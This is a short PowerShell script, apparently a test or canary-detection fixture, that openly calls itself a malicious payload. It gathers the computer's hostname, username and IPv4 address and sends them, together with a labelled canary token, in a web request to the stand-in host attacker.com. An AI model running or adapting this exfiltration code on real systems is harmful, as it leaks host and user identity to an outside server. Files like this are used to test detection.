# Malicious PowerShell Payload - CANARY_TOKEN: AKIAIOSFODNN7EXAMPLE
# This script exfiltrates system information

Write-Host "Payload executed at $(Get-Date)"

# Collect system information
$hostname = $env:COMPUTERNAME
$user = $env:USERNAME
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} | Select-Object -First 1).IPAddress

# Exfiltrate data
$uri = "http://attacker.com/exfil?hostname=$hostname&user=$user&ip=$ip&token=AKIAIOSFODNN7EXAMPLE"
Invoke-WebRequest -Uri $uri -UseBasicParsing

Write-Host "Malicious payload established"
